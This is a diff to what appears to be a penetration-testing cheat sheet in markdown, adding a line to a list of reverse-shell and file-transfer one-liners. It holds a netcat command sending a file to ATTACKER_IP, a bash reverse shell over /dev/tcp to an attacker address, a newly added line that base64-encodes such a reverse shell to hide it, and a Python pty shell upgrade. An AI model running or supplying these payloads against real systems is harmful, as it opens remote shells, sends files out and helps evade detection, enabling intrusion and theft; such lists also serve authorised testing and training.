@@ -7,6 +7,7 @@ Copy CLIENT nc -w 3 ATTACKER_IP ATTACKER_PORT < [file_to_download] SERVER nc -l 
 
 ### Bash connects
 Connections "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1'"
+Encripted echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
 
 ### Python PSEUDOshell ###
 python -c 'import pty; pty.spawn("/bin/bash")'
